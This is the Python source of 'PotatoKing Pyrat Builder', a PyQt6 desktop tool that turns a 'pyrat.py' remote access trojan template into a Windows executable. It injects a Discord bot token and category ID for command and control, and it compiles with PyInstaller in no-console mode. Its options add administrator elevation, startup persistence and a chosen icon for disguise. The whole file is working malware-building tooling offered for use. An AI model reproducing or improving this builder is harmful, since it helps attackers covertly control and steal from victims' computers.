import sys
import os
import subprocess
import shutil
import base64
import re
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                             QFormLayout, QLabel, QLineEdit, QPushButton, QFileDialog, 
                             QPlainTextEdit, QGroupBox, QColorDialog, QStatusBar, QCheckBox)
from PyQt6.QtGui import QFont, QIcon, QColor, QPixmap, QCursor
from PyQt6.QtCore import QObject, QThread, pyqtSignal, Qt

class Worker(QObject):
    log_message = pyqtSignal(str)
    build_finished = pyqtSignal(bool, str)

    def __init__(self, config):
        super().__init__()
        self.config = config

    def run(self):
        try:
            self.log_message.emit("[*] Build process started...")

            if not self.config["token"] or not self.config["category_id"] or not self.config["output_name"]:
                raise ValueError("Token, Category ID, and Filename are required.")

            self.log_message.emit("[*] Reading template file 'pyrat.py'...")
            try:
                with open('pyrat.py', 'r', encoding='utf-8') as f:
                    template_code = f.read()
            except FileNotFoundError:
                raise FileNotFoundError("The 'pyrat.py' template file was not found in the same directory.")

            self.log_message.emit("[*] Injecting configuration into payload...")
            
            code_with_config = template_code.replace("token", self.config["token"])
            code_with_config = code_with_config.replace("123456789012345678", self.config["category_id"])
            code_with_config = code_with_config.replace("'%ADD_TO_STARTUP%'", str(self.config['add_to_startup']))

            r, g, b = self.config["theme_color"].getRgb()[:3]
            code_with_config = re.sub(
                r'CYAN_THEME\s*=\s*discord\.Color\.from_rgb\([^)]+\)',
                f'CYAN_THEME = discord.Color.from_rgb({r}, {g}, {b})',
                code_with_config
            )

            build_file = "build_temp.py"
            with open(build_file, 'w', encoding='utf-8') as f:
                f.write(code_with_config)
            self.log_message.emit("[+] Configuration & Theme injected successfully.")

            pyinstaller_cmd =[
                'pyinstaller',
                '--noconfirm',
                '--onefile',
                '--noconsole',
                '--name', self.config["output_name"]
            ]

            if self.config["icon_path"] and os.path.exists(self.config["icon_path"]):
                pyinstaller_cmd.extend(['--icon', self.config["icon_path"]])
                self.log_message.emit(f"[*] Added icon: {self.config['icon_path']}")
                
            if self.config["require_admin"]:
                pyinstaller_cmd.extend(['--uac-admin'])
                self.log_message.emit("[*] Payload configured to request administrator privileges.")
            
            pyinstaller_cmd.append(build_file)

            self.log_message.emit("[*] Compiling executable with PyInstaller... This may take a moment.")
            process = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, encoding='utf-8')

            if process.stdout:
                self.log_message.emit(process.stdout)
            if process.stderr:
                self.log_message.emit(process.stderr)

            if process.returncode != 0:
                raise Exception("PyInstaller compilation failed. Check the logs above for details.")
            
            self.log_message.emit("[+] Executable compiled successfully!")

            self.log_message.emit("[*] Cleaning up temporary files...")
            dist_dir = os.path.join(os.getcwd(), 'dist')
            final_path = os.path.join(dist_dir, self.config['output_name'])
            
            if not os.path.exists(final_path):
                 final_path += ".exe" 
                 if not os.path.exists(final_path):
                     raise FileNotFoundError(f"Could not find the compiled file in '{dist_dir}'.")

        except Exception as e:
            self.log_message.emit(f"\n[!] ERROR: {e}")
            self.build_finished.emit(False, str(e))
        else:
            self.build_finished.emit(True, final_path)
        finally:
            if os.path.exists(build_file): os.remove(build_file)
            spec_file = f"{os.path.splitext(self.config['output_name'])[0]}.spec"
            if os.path.exists(spec_file): os.remove(spec_file)
            if os.path.isdir("build"): shutil.rmtree("build")
            self.log_message.emit("[+] Cleanup complete.")


class PyratBuilderApp(QMainWindow):
    ICON_B64 = "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"

    def __init__(self):
        super().__init__()
        self.setWindowTitle("PotatoKing Pyrat Builder")
        self.setFixedSize(750, 900)
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowType.WindowMaximizeButtonHint)
        
        self.theme_color = QColor("#00FFFF")

        self.central_widget = QWidget()
        self.central_widget.setObjectName("CentralWidget")
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)
        self.main_layout.setContentsMargins(30, 25, 30, 25)
        self.main_layout.setSpacing(18)
        
        self.init_ui()
        self._update_theme_style()
        self._set_app_icon()

    def init_ui(self):
        credits_label = QLabel("Developed by PotatoKing | https://pyrat.site")
        credits_label.setFont(QFont("Segoe UI", 10))
        credits_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        credits_label.setStyleSheet("color: #7a7a85; margin-bottom: 15px;")
        self.main_layout.addWidget(credits_label)

        config_group = QGroupBox("Core Configuration")
        form_layout = QFormLayout(config_group)
        form_layout.setContentsMargins(20, 35, 20, 20)
        form_layout.setSpacing(15)
        
        self.token_input = QLineEdit()
        self.token_input.setEchoMode(QLineEdit.EchoMode.Password)
        self.token_input.setPlaceholderText("Enter your Discord Bot Token")
        
        self.category_id_input = QLineEdit()
        self.category_id_input.setPlaceholderText("e.g. 123456789012345678")
        
        self.filename_input = QLineEdit("pyrat_payload")
        self.filename_input.setPlaceholderText("Output name without .exe")
        
        form_layout.addRow(self._create_label("Discord Bot Token:"), self.token_input)
        form_layout.addRow(self._create_label("Category ID:"), self.category_id_input)
        form_layout.addRow(self._create_label("Output Filename:"), self.filename_input)
        self.main_layout.addWidget(config_group)

        options_group = QGroupBox("Payload Options")
        options_layout = QVBoxLayout(options_group)
        options_layout.setContentsMargins(20, 35, 20, 20)
        options_layout.setSpacing(12)
        
        self.require_admin_checkbox = QCheckBox("Request administrator privileges on execution (--uac-admin)")
        self.add_to_startup_checkbox = QCheckBox("Add to system startup for persistence")
        
        options_layout.addWidget(self.require_admin_checkbox)
        options_layout.addWidget(self.add_to_startup_checkbox)
        self.main_layout.addWidget(options_group)

        custom_group = QGroupBox("Cosmetic Customization")
        custom_layout = QFormLayout(custom_group)
        custom_layout.setContentsMargins(20, 35, 20, 20)
        custom_layout.setSpacing(15)
        
        self.icon_path_input = QLineEdit()
        self.icon_path_input.setPlaceholderText("Leave blank for default PyInstaller icon")
        browse_button = QPushButton("Browse...")
        browse_button.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
        browse_button.clicked.connect(self._browse_icon)
        
        icon_layout = QHBoxLayout()
        icon_layout.addWidget(self.icon_path_input)
        icon_layout.addWidget(browse_button)
        
        color_layout = QHBoxLayout()
        self.color_preview = QLabel()
        self.color_preview.setFixedSize(24, 24)
        self.color_preview.setStyleSheet(f"background-color: {self.theme_color.name()}; border-radius: 12px; border: 2px solid #23232e;")
        
        self.color_button = QPushButton("Select Discord Theme Color")
        self.color_button.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
        self.color_button.clicked.connect(self._pick_color)
        
        color_layout.addWidget(self.color_preview)
        color_layout.addWidget(self.color_button)
        color_layout.addStretch()

        custom_layout.addRow(self._create_label("Payload Icon:"), icon_layout)
        custom_layout.addRow(self._create_label("RAT Theme Color:"), color_layout)
        self.main_layout.addWidget(custom_group)

        self.build_button = QPushButton("BUILD PYRAT")
        self.build_button.setFont(QFont("Segoe UI", 16, QFont.Weight.Bold))
        self.build_button.setCursor(QCursor(Qt.CursorShape.PointingHandCursor))
        self.build_button.clicked.connect(self._start_build)
        self.main_layout.addWidget(self.build_button)

        self.log_console = QPlainTextEdit()
        self.log_console.setReadOnly(True)
        self.log_console.setFont(QFont("Consolas", 10))
        self.main_layout.addWidget(self.log_console)
        
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready to build. Fill out configuration.")

    def _create_label(self, text):
        lbl = QLabel(text)
        lbl.setFont(QFont("Segoe UI", 10))
        return lbl

    def _set_app_icon(self):
        b64_string = self.ICON_B64
        b64_string += "=" * ((4 - len(b64_string) % 4) % 4)
        icon_data = base64.b64decode(b64_string)
        pixmap = QPixmap()
        pixmap.loadFromData(icon_data)
        self.setWindowIcon(QIcon(pixmap))

    def _update_theme_style(self):
        color_hex = self.theme_color.name()
        darker_color = self.theme_color.darker(120).name()
        
        style_sheet = f"""
            QMainWindow, #CentralWidget {{
                background-color: #0d0d12;
                color: #e0e0e0;
                font-family: 'Segoe UI', Arial, sans-serif;
            }}
            QGroupBox {{
                font-weight: bold;
                font-size: 14px;
                border: 1px solid #23232e;
                border-radius: 10px;
                margin-top: 25px;
                background-color: #15151c;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                subcontrol-position: top left;
                padding: 0 10px;
                left: 15px;
                color: {color_hex};
                background-color: transparent;
            }}
            QLabel {{
                background-color: transparent;
                color: #e0e0e0;
            }}
            QLineEdit {{
                background-color: #09090c;
                border: 1px solid #23232e;
                padding: 8px 12px;
                min-height: 22px;
                border-radius: 6px;
                color: #ffffff;
                font-size: 13px;
            }}
            QLineEdit::placeholder {{
                color: #555566;
            }}
            QLineEdit:focus {{
                border: 1px solid {color_hex};
            }}
            QPushButton {{
                background-color: #1a1a24;
                border: 1px solid #23232e;
                padding: 8px 15px;
                min-height: 22px;
                border-radius: 6px;
                color: #ffffff;
                font-weight: bold;
            }}
            QPushButton:hover {{
                background-color: #23232e;
                border-color: {color_hex};
                color: {color_hex};
            }}
            #BuildButton {{
                background-color: {color_hex};
                color: #0d0d12;
                border: none;
                border-radius: 8px;
                margin-top: 15px;
                min-height: 50px;
            }}
            #BuildButton:hover {{
                background-color: {darker_color};
            }}
            #BuildButton:disabled {{
                background-color: #15151c;
                color: #444455;
            }}
            QCheckBox {{
                color: #e0e0e0;
                font-size: 13px;
                spacing: 12px;
                background-color: transparent;
            }}
            QCheckBox::indicator {{
                width: 18px;
                height: 18px;
                border-radius: 4px;
                border: 1px solid #333344;
                background-color: #09090c;
            }}
            QCheckBox::indicator:hover {{
                border: 1px solid {color_hex};
            }}
            QCheckBox::indicator:checked {{
                background-color: {color_hex};
                border: 1px solid {color_hex};
            }}
            QPlainTextEdit {{
                background-color: #09090c;
                color: {color_hex};
                border: 1px solid #23232e;
                border-radius: 8px;
                padding: 12px;
            }}
            QStatusBar {{
                color: #7a7a85;
                background-color: #0d0d12;
            }}
        """
        self.build_button.setObjectName("BuildButton")
        self.setStyleSheet(style_sheet)
        self.color_preview.setStyleSheet(f"background-color: {color_hex}; border-radius: 12px; border: 2px solid #23232e;")
    
    def _pick_color(self):
        color = QColorDialog.getColor(self.theme_color, self)
        if color.isValid():
            self.theme_color = color
            self._update_theme_style()

    def _browse_icon(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Icon", "", "Icon Files (*.ico)")
        if file_path:
            self.icon_path_input.setText(file_path)

    def _log(self, message):
        self.log_console.appendPlainText(message)
    
    def _toggle_controls(self, enabled):
        self.token_input.setEnabled(enabled)
        self.category_id_input.setEnabled(enabled)
        self.filename_input.setEnabled(enabled)
        self.icon_path_input.setEnabled(enabled)
        self.color_button.setEnabled(enabled)
        self.require_admin_checkbox.setEnabled(enabled)
        self.add_to_startup_checkbox.setEnabled(enabled)
        self.build_button.setEnabled(enabled)
        self.build_button.setText("BUILD PYRAT" if enabled else "BUILDING...")

    def _start_build(self):
        self._toggle_controls(False)
        self.status_bar.showMessage("Build in progress... please wait.")
        self.log_console.clear()

        config = {
            "token": self.token_input.text().strip(),
            "category_id": self.category_id_input.text().strip(),
            "output_name": self.filename_input.text().strip() or "pyrat_payload",
            "icon_path": self.icon_path_input.text().strip(),
            "theme_color": self.theme_color,
            "require_admin": self.require_admin_checkbox.isChecked(),
            "add_to_startup": self.add_to_startup_checkbox.isChecked()
        }

        self.thread = QThread()
        self.worker = Worker(config)
        self.worker.moveToThread(self.thread)

        self.thread.started.connect(self.worker.run)
        self.worker.log_message.connect(self._log)
        self.worker.build_finished.connect(self._on_build_finished)
        self.worker.build_finished.connect(self.thread.quit)
        self.worker.build_finished.connect(self.worker.deleteLater)
        self.thread.finished.connect(self.thread.deleteLater)
        
        self.thread.start()

    def _on_build_finished(self, success, message):
        self._toggle_controls(True)
        if success:
            self._log("\n" + "="*60)
            self._log(f"✅ Build successful! Your RAT is at: {message}")
            self._log("="*60)
            self.status_bar.showMessage("Build finished successfully!")
        else:
            self._log("\n[!] Build failed. Check the log for details.")
            self.status_bar.showMessage("Build failed!")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = PyratBuilderApp()
    window.show()
    sys.exit(app.exec())
